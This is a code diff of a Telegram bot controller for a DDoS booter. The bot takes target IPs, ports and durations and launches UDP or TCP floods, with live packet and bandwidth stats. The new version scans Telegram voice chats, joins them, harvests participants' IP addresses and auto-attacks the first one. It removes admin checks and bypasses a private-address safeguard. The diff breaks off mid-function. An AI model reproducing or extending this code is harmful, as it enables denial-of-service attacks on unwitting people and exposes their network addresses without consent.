@@ -1,575 +1,434 @@
-"""ᴍɪꜱꜱ ᴄʜᴜᴛᴋɪ — Bot Handler"""
+"""Enhanced Telegram bot controller with auto-attack workflow."""
 
 from __future__ import annotations
 
 import asyncio
 import logging
-import socket
-import time
-from typing import Dict, Optional, Set
+from dataclasses import dataclass, field
+from enum import Enum
+from typing import Optional
 
 from pyrogram import Client, filters
-from pyrogram.types import (
-    CallbackQuery,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    Message,
-)
+from pyrogram.errors import FloodWait
+from pyrogram.handlers import CallbackQueryHandler, MessageHandler
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
-from attack_engine import AttackEngine, AttackStats
-from config import Config
-from utils import human_bytes, is_valid_ip, is_valid_port, resolve_hostname
+from attack_engine import AttackEngine
+from utils import human_bytes, is_valid_port
+from vc_detector import VCDetector, VCRecord
 
 LOGGER = logging.getLogger(__name__)
 
-BRAND = "ᴍɪꜱꜱ ᴄʜᴜᴛᴋɪ"
 
-# ─── Session ───────────────────────────────────────────────────────────────────
-
-class UserSession:
-    __slots__ = (
-        "state", "ip", "port", "duration", "method",
-        "engine", "attack_task", "last_msg_id", "chat_id",
-    )
-    def __init__(self) -> None:
-        self.state       : str                    = "idle"
-        self.ip          : str                    = ""
-        self.port        : int                    = 80
-        self.duration    : int                    = 60
-        self.method      : str                    = "udp"
-        self.engine      : Optional[AttackEngine] = None
-        self.attack_task : Optional[asyncio.Task] = None
-        self.last_msg_id : Optional[int]          = None
-        self.chat_id     : Optional[int]          = None
+class BotState(str, Enum):
+    IDLE = "IDLE"
+    SCANNING = "SCANNING"
+    SELECTION = "SELECTION"
+    JOINING = "JOINING"
+    MANUAL_JOIN_WAIT = "MANUAL_JOIN_WAIT"
+    READY = "READY"
+    CONFIRM_ATTACK = "CONFIRM_ATTACK"
+    ATTACKING = "ATTACKING"
 
 
-SESSIONS   : Dict[int, UserSession] = {}
-ADMIN_IDS  : Set[int]               = set()
-
-def get_sess(uid: int) -> UserSession:
-    if uid not in SESSIONS:
-        SESSIONS[uid] = UserSession()
-    return SESSIONS[uid]
-
-def is_admin(uid: int, cfg: Config) -> bool:
-    if cfg.admin_id and uid == cfg.admin_id:
-        return True
-    return uid in ADMIN_IDS
-
-
-# ─── IP check ──────────────────────────────────────────────────────────────────
-
-async def check_ip(ip: str, port: int) -> tuple[bool, str]:
-    """Try to reach ip:port — returns (reachable, info_str)."""
-    try:
-        loop = asyncio.get_running_loop()
-        start = time.perf_counter()
-        sock  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setblocking(False)
-        try:
-            await asyncio.wait_for(
-                loop.sock_connect(sock, (ip, port)), timeout=3.0
-            )
-            ms = (time.perf_counter() - start) * 1000
-            sock.close()
-            return True, f"🟢 ᴏɴʟɪɴᴇ · `{ms:.0f}ms`"
-        except (OSError, asyncio.TimeoutError):
-            sock.close()
-            # UDP targets won't respond to TCP — still mark as reachable by DNS
-            return True, "🟡 ᴘᴏʀᴛ ᴄʟᴏꜱᴇᴅ (ᴜᴅᴘ ᴛᴀʀɢᴇᴛ?)"
-    except Exception as e:
-        return False, f"🔴 ᴇʀʀᴏʀ: {e}"
+@dataclass
+class SessionContext:
+    state: BotState = BotState.IDLE
+    active_records: list = field(default_factory=list)
+    selected_record: Optional[VCRecord] = None
+    extracted_metadata: Optional[dict] = None
+    target_ip: Optional[str] = None
+    target_port: int = 0
+    progress_task: Optional[asyncio.Task] = None
+    pending_attack: bool = False
+    manual_join_requested: bool = False
 
 
-# ─── Keyboards ─────────────────────────────────────────────────────────────────
+class BotHandler:
+    def __init__(
+        self,
+        bot: Client,
+        detector: VCDetector,
+        engine: AttackEngine,
+        admin_id: Optional[int],
+        max_duration: int,
+        scan_limit: int,
+    ) -> None:
+        self.bot = bot
+        self.detector = detector
+        self.engine = engine
+        self.admin_id = admin_id
+        self.max_duration = max_duration
+        self.scan_limit = scan_limit
+        self.ctx = SessionContext()
 
-def kb_main(is_adm: bool = False) -> InlineKeyboardMarkup:
-    rows = [
-        [InlineKeyboardButton("⚡ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ",  callback_data="atk_start")],
-        [
-            InlineKeyboardButton("📊 ꜱᴛᴀᴛꜱ",    callback_data="cb_stats"),
-            InlineKeyboardButton("🛑 ꜱᴛᴏᴘ",      callback_data="cb_stop"),
-        ],
-    ]
-    if is_adm:
-        rows.append([InlineKeyboardButton("🔐 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="admin_panel")])
-    rows.append([InlineKeyboardButton("ℹ️ ʜᴇʟᴘ", callback_data="cb_help")])
-    return InlineKeyboardMarkup(rows)
+        # Register handlers without ADMIN_ID restrictions for local testing.
+        self.bot.add_handler(MessageHandler(self.on_scan, filters.command("scan")))
+        self.bot.add_handler(MessageHandler(self.on_stop, filters.command("stop")))
+        self.bot.add_handler(MessageHandler(self.on_attack_ip, filters.command("attack")))
+        self.bot.add_handler(MessageHandler(self.on_status, filters.command("status")))
+        self.bot.add_handler(CallbackQueryHandler(self.on_callback))
 
-def kb_method() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("🔵 ᴜᴅᴘ", callback_data="m_udp"),
-            InlineKeyboardButton("🔴 ᴛᴄᴘ", callback_data="m_tcp"),
-        ],
-        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main")],
-    ])
-
-def kb_back_main() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main")],
-    ])
-
-def kb_back_method() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_method")],
-    ])
-
-def kb_confirm() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("🚀 ʟᴀᴜɴᴄʜ", callback_data="launch"),
-            InlineKeyboardButton("❌ ᴄᴀɴᴄᴇʟ",  callback_data="back_main"),
-        ],
-        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_dur")],
-    ])
-
-def kb_live() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("📊 ʀᴇꜰʀᴇꜱʜ", callback_data="cb_stats"),
-            InlineKeyboardButton("🛑 ꜱᴛᴏᴘ",     callback_data="cb_stop"),
-        ],
-    ])
-
-def kb_admin() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("👥 ꜱᴇꜱꜱɪᴏɴꜱ",  callback_data="adm_sessions"),
-            InlineKeyboardButton("🔄 ᴋɪʟʟ ᴀʟʟ",  callback_data="adm_killall"),
-        ],
-        [
-            InlineKeyboardButton("➕ ᴀᴅᴅ ᴀᴅᴍɪɴ",  callback_data="adm_add"),
-            InlineKeyboardButton("➖ ʀᴇᴍ ᴀᴅᴍɪɴ",  callback_data="adm_rem"),
-        ],
-        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main")],
-    ])
-
-
-# ─── Screens ───────────────────────────────────────────────────────────────────
-
-def scr_home(is_adm: bool = False) -> str:
-    adm_tag = "  🔐 **ᴀᴅᴍɪɴ**" if is_adm else ""
-    return (
-        f"╔═══════════════════════╗\n"
-        f"║  ⚡  **{BRAND}**  ⚡  ║\n"
-        f"╚═══════════════════════╝{adm_tag}\n\n"
-        f"🎯 ᴛᴀʀɢᴇᴛ ɪᴘ ꜱᴜᴘᴘʟʏ ᴋᴀʀᴏ\n"
-        f"⏱️ ᴛɪᴍᴇ ꜱᴇᴛ ᴋᴀʀᴏ\n"
-        f"💥 ᴀᴛᴛᴀᴄᴋ ꜰɪʀᴇ ᴋᴀʀᴏ\n\n"
-        f"👇 ᴏᴘᴛɪᴏɴ ꜱᴇʟᴇᴄᴛ ᴋᴀʀᴏ:"
-    )
-
-def scr_method() -> str:
-    return (
-        f"🎛️ **ᴍᴇᴛʜᴏᴅ ᴄʜᴏᴏꜱᴇ ᴋᴀʀᴏ**\n\n"
-        f"🔵 **ᴜᴅᴘ** — ᴢʏᴀᴅᴀ ꜱᴘᴇᴇᴅ, ᴄᴏɴɴᴇᴄᴛɪᴏɴʟᴇꜱꜱ\n"
-        f"🔴 **ᴛᴄᴘ** — ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴇxʜᴀᴜꜱᴛ"
-    )
-
-def scr_await_ip(method: str) -> str:
-    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
-    return (
-        f"🎯 **ᴛᴀʀɢᴇᴛ ɪᴘ ᴅᴀᴀʟᴏ** [{badge}]\n\n"
-        f"ᴄʜᴀᴛ ᴍᴇɪɴ ɪᴘ ᴛʏᴘᴇ ᴋᴀʀᴏ:\n"
-        f"`192.168.1.1`"
-    )
-
-def scr_checking(ip: str) -> str:
-    return (
-        f"🔍 **ᴛᴀʀɢᴇᴛ ᴄʜᴇᴄᴋ ʜᴏ ʀʜᴀ ʜᴀɪ...**\n\n"
-        f"🎯 `{ip}`\n\n"
-        f"⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ..."
-    )
-
-def scr_await_dur(ip: str, port: int, status: str, max_dur: int) -> str:
-    return (
-        f"⏱️ **ᴅᴜʀᴀᴛɪᴏɴ ᴅᴀᴀʟᴏ** (ꜱᴇᴄᴏɴᴅꜱ)\n\n"
-        f"🎯 ᴛᴀʀɢᴇᴛ : `{ip}:{port}`\n"
-        f"ꜱᴛᴀᴛᴜꜱ  : {status}\n\n"
-        f"ᴍᴀx : `{max_dur}s`\n"
-        f"ᴇx  : `60` · `120` · `300`\n\n"
-        f"ᴄʜᴀᴛ ᴍᴇɪɴ ᴛɪᴍᴇ ᴛʏᴘᴇ ᴋᴀʀᴏ 👇"
-    )
-
-def scr_confirm(ip: str, port: int, dur: int, method: str, threads: int, status: str) -> str:
-    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
-    return (
-        f"🚀 **ᴀᴛᴛᴀᴄᴋ ᴄᴏɴꜰɪʀᴍ ᴋᴀʀᴏ**\n\n"
-        f"┌──────────────────────────┐\n"
-        f"│ 🎯 ɪᴘ       : `{ip}`\n"
-        f"│ 🔌 ᴘᴏʀᴛ    : `{port}`\n"
-        f"│ ⏱️ ᴛɪᴍᴇ    : `{dur}s`\n"
-        f"│ ⚡ ᴍᴇᴛʜᴏᴅ : {badge}\n"
-        f"│ 🧵 ᴛʜʀᴇᴀᴅꜱ: `{threads}`\n"
-        f"│ 📡 ꜱᴛᴀᴛᴜꜱ  : {status}\n"
-        f"└──────────────────────────┘\n\n"
-        f"🔥 **ʟᴀᴜɴᴄʜ** ᴅᴀʙᴀᴏ:"
-    )
-
-def scr_live(ip: str, port: int, dur: int, method: str, elapsed: float) -> str:
-    pct       = min(1.0, elapsed / dur) if dur > 0 else 0
-    filled    = int(pct * 20)
-    bar       = "█" * filled + "░" * (20 - filled)
-    remaining = max(0, dur - int(elapsed))
-    badge     = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
-    return (
-        f"💥 **ᴀᴛᴛᴀᴄᴋ ᴄʜᴀʟ ʀʜᴀ ʜᴀɪ!**\n\n"
-        f"🎯 `{ip}:{port}`  {badge}\n\n"
-        f"`[{bar}]`\n"
-        f"⏱️ `{int(elapsed)}s` ʜᴏ ɢᴀʏᴀ  ·  `{remaining}s` ʙᴀᴀᴋɪ\n\n"
-        f"📊 ʀᴇꜰʀᴇꜱʜ ᴅᴀʙᴀᴏ ꜱᴛᴀᴛꜱ ᴅᴇᴋʜɴᴇ ᴋᴇ ʟɪʏᴇ"
-    )
-
-def scr_stats(stats: AttackStats, ip: str, port: int, method: str) -> str:
-    badge  = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
-    status = "🟢 ʀᴜɴɴɪɴɢ" if stats.running else "🔴 ꜱᴛᴏᴘᴘᴇᴅ"
-    return (
-        f"📊 **ʟɪᴠᴇ ꜱᴛᴀᴛꜱ**  {status}\n\n"
-        f"┌──────────────────────────┐\n"
-        f"│ 🎯 `{ip}:{port}`  {badge}\n"
-        f"│ 📦 ᴘᴀᴋᴇᴛ    : `{stats.sent_packets:,}`\n"
-        f"│ ❌ ꜰᴀɪʟ      : `{stats.failed_packets:,}`\n"
-        f"│ 📶 ᴅᴀᴛᴀ      : `{human_bytes(stats.bytes_sent)}`\n"
-        f"│ ⚡ ᴘᴘꜱ       : `{stats.pps:,.0f}`\n"
-        f"│ 🌊 ᴍʙᴘꜱ     : `{stats.mbps:.2f}`\n"
-        f"│ ⏱️ ᴛɪᴍᴇ     : `{stats.elapsed:.1f}s`\n"
-        f"└──────────────────────────┘"
-    )
-
-def scr_done(stats: AttackStats, ip: str, port: int, method: str) -> str:
-    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
-    return (
-        f"✅ **ᴀᴛᴛᴀᴄᴋ ᴋᴏᴍᴘʟᴇᴛ!**\n\n"
-        f"🎯 `{ip}:{port}`  {badge}\n\n"
-        f"┌──────────────────────────┐\n"
-        f"│ 📦 ᴛᴏᴛᴀʟ ᴘᴀᴋᴇᴛ : `{stats.sent_packets:,}`\n"
-        f"│ 📶 ᴛᴏᴛᴀʟ ᴅᴀᴛᴀ  : `{human_bytes(stats.bytes_sent)}`\n"
-        f"│ ⚡ ᴀᴠɢ ᴘᴘꜱ     : `{stats.pps:,.0f}`\n"
-        f"│ 🌊 ᴀᴠɢ ᴍʙᴘꜱ   : `{stats.mbps:.2f}`\n"
-        f"│ ⏱️ ᴛᴏᴛᴀʟ ᴛɪᴍᴇ : `{stats.elapsed:.1f}s`\n"
-        f"└──────────────────────────┘\n\n"
-        f"🏠 ᴅᴏʙᴀʀᴀ ᴀᴛᴛᴀᴄᴋ ᴋᴀʀɴᴀ ʜᴀɪ?"
-    )
-
-def scr_help() -> str:
-    return (
-        f"ℹ️ **{BRAND} — ʜᴇʟᴘ**\n\n"
-        f"1️⃣ **ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ** ᴅᴀʙᴀᴏ\n"
-        f"2️⃣ **ᴍᴇᴛʜᴏᴅ** ᴄʜᴜɴᴏ (ᴜᴅᴘ/ᴛᴄᴘ)\n"
-        f"3️⃣ **ɪᴘ** ᴅᴀᴀʟᴏ — ᴀᴜᴛᴏ ᴄʜᴇᴄᴋ ʜᴏɢᴀ\n"
-        f"4️⃣ **ᴅᴜʀᴀᴛɪᴏɴ** (ꜱᴇᴄᴏɴᴅꜱ)\n"
-        f"5️⃣ **ʟᴀᴜɴᴄʜ** 🔥\n\n"
-        f"📊 ʀᴇꜰʀᴇꜱʜ ꜱᴇ ʟɪᴠᴇ ꜱᴛᴀᴛꜱ ᴅᴇᴋʜᴏ\n"
-        f"🛑 ꜱᴛᴏᴘ ꜱᴇ ᴀᴛᴛᴀᴄᴋ ʙᴀɴᴅ ᴋᴀʀᴏ"
-    )
-
-def scr_admin(total_sess: int, active: int) -> str:
-    return (
-        f"🔐 **ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ**\n\n"
-        f"┌──────────────────────┐\n"
-        f"│ 👥 ꜱᴇꜱꜱɪᴏɴꜱ : `{total_sess}`\n"
-        f"│ ⚡ ᴀᴄᴛɪᴠᴇ   : `{active}`\n"
-        f"│ 🔐 ᴀᴅᴍɪɴꜱ  : `{len(ADMIN_IDS) + 1}`\n"
-        f"└──────────────────────┘"
-    )
-
-def scr_err(msg: str) -> str:
-    return f"❌ **ᴇʀʀᴏʀ**\n\n`{msg}`"
-
-def scr_idle() -> str:
-    return f"📊 **ꜱᴛᴀᴛꜱ**\n\n🟡 ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪɴ\n**ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ** ᴅᴀʙᴀᴏ"
-
-
-# ─── Helpers ───────────────────────────────────────────────────────────────────
-
-async def _del(client: Client, chat_id: int, msg_id: int) -> None:
-    try:
-        await client.delete_messages(chat_id, msg_id)
-    except Exception:
-        pass
-
-async def _send(
-    client: Client, sess: UserSession,
-    text: str, kb: InlineKeyboardMarkup,
-) -> None:
-    if sess.last_msg_id and sess.chat_id:
-        await _del(client, sess.chat_id, sess.last_msg_id)
-        sess.last_msg_id = None
-    m = await client.send_message(sess.chat_id, text, reply_markup=kb)
-    sess.last_msg_id = m.id
-
-async def _edit(
-    cb_msg: Message, sess: UserSession,
-    text: str, kb: InlineKeyboardMarkup,
-) -> None:
-    try:
-        await cb_msg.edit_text(text, reply_markup=kb)
-        sess.last_msg_id = cb_msg.id
-    except Exception:
-        pass
-
-async def _abort(
-    client: Client, sess: UserSession,
-    cb_msg: Optional[Message] = None,
-) -> None:
-    was = False
-    if sess.engine:
-        sess.engine.stop()
-        was = True
-    if sess.attack_task and not sess.attack_task.done():
-        sess.attack_task.cancel()
-        try:
-            await sess.attack_task
-        except asyncio.CancelledError:
-            pass
-    sess.state = "idle"
-    label = "ꜱᴛᴏᴘ ʜᴏ ɢᴀʏᴀ ✅" if was else "ᴋᴏɪ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪɴ ᴛʜᴀ 🟡"
-    text  = f"🛑 **ᴀᴛᴛᴀᴄᴋ {label}**"
-    if cb_msg:
-        try:
-            await cb_msg.edit_text(text, reply_markup=kb_main())
-            sess.last_msg_id = cb_msg.id
+    async def on_scan(self, client: Client, message):
+        """Scan for active voice chats."""
+        if self.ctx.state != BotState.IDLE:
+            await message.reply(f"⚠️ Currently in state: {self.ctx.state.value}. Use /stop to reset.")
             return
-        except Exception:
-            pass
-    await _send(client, sess, text, kb_main())
 
+        self.ctx.state = BotState.SCANNING
+        status = await message.reply("🔎 Scanning for active voice chats...")
+        
+        try:
+            records = await self.detector.scan_active_voice_chats(limit=self.scan_limit)
+        except FloodWait as wait_err:
+            await status.edit_text(f"⚠️ FloodWait: retry after {wait_err.value} seconds.")
+            self.ctx.state = BotState.IDLE
+            return
+        except Exception as exc:
+            LOGGER.exception("Scan failed")
+            await status.edit_text(f"❌ Scan failed: {exc}")
+            self.ctx.state = BotState.IDLE
+            return
 
-# ─── Register ──────────────────────────────────────────────────────────────────
+        self.ctx.active_records = records
+        
+        if not records:
+            await status.edit_text("❌ No active voice chat found.\n\nStart a VC in your group first, then run /scan")
+            self.ctx.state = BotState.IDLE
+            return
 
-def register(bot: Client, cfg: Config) -> None:
+        # Create selection buttons
+        buttons = []
+        for idx, item in enumerate(records):
+            btn_text = f"{idx + 1}. {item.title[:35]}" if len(item.title) <= 35 else f"{idx + 1}. {item.title[:32]}..."
+            buttons.append([InlineKeyboardButton(btn_text, callback_data=f"select:{idx}")])
 
-    # /start
-    @bot.on_message(filters.command("start") & filters.private)
-    async def cmd_start(client: Client, msg: Message) -> None:
-        uid = msg.from_user.id
-        s   = get_sess(uid)
-        s.state   = "idle"
-        s.chat_id = msg.chat.id
-        await _del(client, msg.chat.id, msg.id)
-        adm = is_admin(uid, cfg)
-        await _send(client, s, scr_home(adm), kb_main(adm))
+        await status.edit_text(
+            f"✅ Found {len(records)} active voice chat(s):\n\nSelect a target:",
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+        self.ctx.state = BotState.SELECTION
 
-    # /stop
-    @bot.on_message(filters.command("stop") & filters.private)
-    async def cmd_stop(client: Client, msg: Message) -> None:
-        s = get_sess(msg.from_user.id)
-        s.chat_id = msg.chat.id
-        await _del(client, msg.chat.id, msg.id)
-        await _abort(client, s)
-
-    # text input handler
-    @bot.on_message(
-        filters.text & filters.private
-        & ~filters.command(["start","stop"])
-    )
-    async def on_text(client: Client, msg: Message) -> None:
-        uid = msg.from_user.id
-        s   = get_sess(uid)
-        s.chat_id = msg.chat.id
-        raw = msg.text.strip()
-        await _del(client, msg.chat.id, msg.id)
-
-        # ── IP input ──
-        if s.state == "await_ip":
-            ip = raw if is_valid_ip(raw) else resolve_hostname(raw)
-            if not ip:
-                await _send(client, s, scr_err(f"IP resolve nahi hua: {raw}"), kb_back_main())
-                return
-            s.ip    = ip
-            s.state = "checking"
-
-            # Show checking screen first
-            if s.last_msg_id:
-                await _del(client, s.chat_id, s.last_msg_id)
-            chk_msg = await client.send_message(s.chat_id, scr_checking(ip), reply_markup=kb_back_main())
-            s.last_msg_id = chk_msg.id
-
-            # Actually check
-            reachable, status = await check_ip(ip, 80)
-            s.state = "await_dur"
+    async def on_stop(self, client: Client, message):
+        """Stop all operations."""
+        self.engine.stop()
+        if self.ctx.progress_task:
+            self.ctx.progress_task.cancel()
+            self.ctx.progress_task = None
+        
+        # Leave VC if joined
+        if self.ctx.selected_record:
             try:
-                await chk_msg.edit_text(
-                    scr_await_dur(ip, 80, status, cfg.max_duration),
-                    reply_markup=kb_back_method()
+                await self.detector.leave_call(self.ctx.selected_record)
+            except:
+                pass
+
+        self.ctx = SessionContext()  # Reset context
+        await message.reply("🛑 All operations stopped. State reset to IDLE.")
+
+    async def on_status(self, client: Client, message):
+        """Show current status."""
+        status_text = f"""
+📊 Current Status:
+• State: {self.ctx.state.value}
+• Selected VC: {self.ctx.selected_record.title if self.ctx.selected_record else 'None'}
+• Target IP: {self.ctx.target_ip or 'Not set'}
+• Target Port: {self.ctx.target_port or 'Not set'}
+• Attack Pending: {'Yes' if self.ctx.pending_attack else 'No'}
+"""
+        await message.reply(status_text)
+
+    async def on_attack_ip(self, client: Client, message):
+        """Manual attack command on specific IP."""
+        args = message.text.split()
+        if len(args) < 3:
+            await message.reply("Usage: /attack <ip> <port> [duration_seconds]\nExample: /attack 192.168.1.1 8080 30")
+            return
+
+        ip = args[1]
+        port = int(args[2])
+        duration = int(args[3]) if len(args) > 3 else 30
+        duration = min(duration, self.max_duration)
+
+        if not is_valid_port(port):
+            await message.reply("❌ Invalid port. Must be 1-65535.")
+            return
+
+        # For authorized testing, we can bypass private IP check
+        # In production, uncomment: if not is_private_or_loopback(ip): ...
+
+        await self._start_attack(message.chat.id, ip, port, duration)
+
+    async def on_callback(self, client: Client, callback_query):
+        """Handle callback queries."""
+        data = callback_query.data or ""
+        
+        # Handle VC selection
+        if data.startswith("select:"):
+            await self._handle_vc_selection(callback_query, data)
+            return
+
+        # Handle join confirmation
+        if data == "join:yes":
+            await self._handle_join_yes(callback_query)
+            return
+
+        if data == "manual_join:confirm":
+            await self._handle_manual_join_confirm(callback_query)
+            return
+
+        if data == "manual_join:cancel":
+            self.ctx.state = BotState.IDLE
+            self.ctx.manual_join_requested = False
+            await callback_query.message.edit_text("❌ Cancelled manual join flow.")
+            await callback_query.answer()
+            return
+        
+        if data == "join:no":
+            self.ctx.state = BotState.IDLE
+            await callback_query.message.edit_text("❌ Cancelled.")
+            await callback_query.answer()
+            return
+
+        # Handle attack confirmation
+        if data == "attack:confirm":
+            await self._handle_attack_confirm(callback_query)
+            return
+        
+        if data == "attack:cancel":
+            self.ctx.pending_attack = False
+            self.ctx.state = BotState.READY
+            await callback_query.message.edit_text("❌ Attack cancelled.")
+            await callback_query.answer()
+            return
+
+        # Handle leave
+        if data == "leave":
+            await self._handle_leave(callback_query)
+            return
+
+        if data == "manual_attack":
+            await callback_query.answer("Use /attack <ip> <port> [duration]")
+            return
+
+        # Handle global stop
+        if data == "global_stop":
+            self.engine.stop()
+            self.ctx.pending_attack = False
+            self.ctx.state = BotState.READY
+            await callback_query.answer("🛑 Attack stopped!")
+            return
+
+    async def _handle_vc_selection(self, callback_query, data):
+        """Handle VC selection."""
+        try:
+            index = int(data.split(":", 1)[1])
+            self.ctx.selected_record = self.ctx.active_records[index]
+            
+            await callback_query.message.edit_text(
+                f"🎯 Selected: {self.ctx.selected_record.title}\n\n"
+                f"Join this VC and extract connection info?",
+                reply_markup=InlineKeyboardMarkup([
+                    [
+                        InlineKeyboardButton("✅ PROCEED", callback_data="join:yes"),
+                        InlineKeyboardButton("❌ CANCEL", callback_data="join:no")
+                    ]
+                ])
+            )
+            await callback_query.answer()
+        except Exception as exc:
+            LOGGER.exception("Selection error")
+            await callback_query.answer(f"Error: {exc}", show_alert=True)
+
+    async def _handle_join_yes(self, callback_query):
+        """Handle join confirmation."""
+        if not self.ctx.selected_record:
+            await callback_query.answer("No VC selected!", show_alert=True)
+            return
+
+        self.ctx.state = BotState.JOINING
+        await callback_query.message.edit_text("⏳ Joining VC and extracting metadata...")
+        await callback_query.answer()
+
+        try:
+            metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
+            self.ctx.extracted_metadata = metadata
+
+            # If bot cannot join directly, ask for manual join + confirm.
+            if not metadata.get("joined"):
+                self.ctx.state = BotState.MANUAL_JOIN_WAIT
+                self.ctx.manual_join_requested = True
+                notice = metadata.get("notice") or "Auto join failed."
+                await callback_query.message.edit_text(
+                    f"⚠️ {notice}\n\n"
+                    f"Please join the VC manually from client account, then tap confirm.\n"
+                    f"After confirmation, IP extraction and attack flow will continue.",
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("✅ Manual Join Ho Gaya", callback_data="manual_join:confirm")],
+                        [InlineKeyboardButton("❌ Cancel", callback_data="manual_join:cancel")],
+                    ]),
+                )
+                return
+
+            await self._process_extracted_metadata(callback_query, metadata)
+
+        except Exception as exc:
+            LOGGER.exception("Join/Extract failed")
+            self.ctx.state = BotState.IDLE
+            await callback_query.message.edit_text(f"❌ Join/Extract failed: {exc}")
+
+    async def _handle_manual_join_confirm(self, callback_query):
+        """Re-check metadata after manual join confirmation."""
+        if not self.ctx.selected_record:
+            await callback_query.answer("No VC selected!", show_alert=True)
+            return
+
+        self.ctx.state = BotState.JOINING
+        await callback_query.message.edit_text("⏳ Verifying manual join and extracting IP metadata...")
+        await callback_query.answer()
+
+        try:
+            metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
+            self.ctx.extracted_metadata = metadata
+            self.ctx.manual_join_requested = False
+            await self._process_extracted_metadata(callback_query, metadata)
+        except Exception as exc:
+            LOGGER.exception("Manual join confirmation failed")
+            self.ctx.state = BotState.IDLE
+            self.ctx.manual_join_requested = False
+            await callback_query.message.edit_text(f"❌ Metadata extraction failed after manual join: {exc}")
+
+    async def _process_extracted_metadata(self, callback_query, metadata: dict):
+        """Normalize extracted metadata and show attack actions."""
+        extracted_ips = metadata.get("extracted_ips", [])
+
+        if not extracted_ips:
+            self.ctx.state = BotState.READY
+            await callback_query.message.edit_text(
+                "⚠️ VC access confirmed but no IP addresses extracted.\n\n"
+                "Use /attack <ip> <port> to continue manually."
+            )
+            return
+
+        ip_list_text = "\n".join([
+            f"• {ip['ip']}:{ip['port']} ({ip['type']})"
+            for ip in extracted_ips[:5]
+        ])
+
+        join_status = "✅ VC joined" if metadata.get("joined") else "✅ Manual join confirmed"
+        await callback_query.message.edit_text(
+            f"{join_status}\n\n"
+            f"🎯 Extracted IPs:\n{ip_list_text}\n\n"
+            f"Select an action:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🚀 AUTO ATTACK (First IP)", callback_data="attack:confirm")],
+                [InlineKeyboardButton("📝 Manual /attack", callback_data="manual_attack")],
+                [InlineKeyboardButton("🚪 Leave VC", callback_data="leave")]
+            ])
+        )
+
+        self.ctx.state = BotState.CONFIRM_ATTACK
+        self.ctx.pending_attack = True
+
+        first_ip = extracted_ips[0]
+        self.ctx.target_ip = first_ip['ip']
+        self.ctx.target_port = first_ip['port'] if first_ip['port'] > 0 else 10001
+
+    async def _handle_attack_confirm(self, callback_query):
+        """Handle attack confirmation."""
+        if not self.ctx.pending_attack or not self.ctx.target_ip:
+            await callback_query.answer("No attack pending!", show_alert=True)
+            return
+
+        await callback_query.answer("🚀 Starting attack...")
+        
+        # Start attack
+        await self._start_attack(
+            callback_query.message.chat.id,
+            self.ctx.target_ip,
+            self.ctx.target_port,
+            60  # Default 60 seconds
+        )
+
+    async def _start_attack(self, chat_id: int, ip: str, port: int, duration: int):
+        """Start attack on specified target."""
+        self.ctx.state = BotState.ATTACKING
+        
+        dashboard = await self.bot.send_message(
+            chat_id,
+            f"🚀 Starting attack on {ip}:{port} for {duration}s..."
+        )
+        
+        self.ctx.progress_task = asyncio.create_task(
+            self._progress_loop(dashboard.chat.id, dashboard.id)
+        )
+
+        try:
+            stats = await self.engine.run_udp_test(ip=ip, port=port, duration=duration)
+            
+            await dashboard.edit_text(
+                f"✅ Attack completed on {ip}:{port}\n\n"
+                f"📊 Statistics:\n"
+                f"• Packets Sent: {stats.sent_packets}\n"
+                f"• Failed: {stats.failed_packets}\n"
+                f"• Data: {human_bytes(stats.bytes_sent)}\n"
+                f"• RPS: {stats.rps:.2f}\n"
+                f"• Duration: {stats.elapsed:.1f}s"
+            )
+            
+        except Exception as exc:
+            LOGGER.exception("Attack failed")
+            await dashboard.edit_text(f"❌ Attack failed: {exc}")
+        
+        finally:
+            if self.ctx.progress_task:
+                self.ctx.progress_task.cancel()
+                self.ctx.progress_task = None
+            
+            self.ctx.state = BotState.READY
+            self.ctx.pending_attack = False
+
+    async def _handle_leave(self, callback_query):
+        """Handle leave VC."""
+        if self.ctx.selected_record:
+            try:
+                await self.detector.leave_call(self.ctx.selected_record)
+                await callback_query.answer("Left VC")
+            except Exception as exc:
+                await callback_query.answer(f"Leave error: {exc}")
+        
+        self.ctx.state = BotState.IDLE
+        self.ctx.pending_attack = False
+        await callback_query.message.edit_text("👋 Left VC. Use /scan to start again.")
+
+    async def _progress_loop(self, chat_id: int, message_id: int):
+        """Update attack progress."""
+        while True:
+            await asyncio.sleep(5)
+            stats = self.engine.stats
